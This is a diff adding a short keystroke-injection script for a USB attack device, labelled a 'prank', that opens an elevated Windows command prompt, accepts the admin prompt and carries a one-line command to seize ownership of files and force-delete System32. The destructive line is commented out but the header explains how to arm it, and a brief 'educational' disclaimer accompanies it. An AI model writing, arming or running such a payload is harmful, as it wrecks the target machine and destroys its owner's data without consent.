@@ -1,0 +1,20 @@
+REM Title:32 wants the D
+REM Author: !Arian
+REM Target: Win, tested on 10
+REM Version: 1.0
+REM Category: Prank
+REM D as in DELETE! Deletes System32.
+REM THIS WILL DELETE THINGS AND MAKE COMPUTER UNHAPPY
+REM Uncomment out the string below to arm the script.
+REM For educational/sysadmin purposes, as a reminder destruction of property is a crime
+REM
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM STRING takeown /f * /r /a /d y && icacls * /inheritance:r /grant:r administrators:(F) /t & del /f /q *
+ENTER
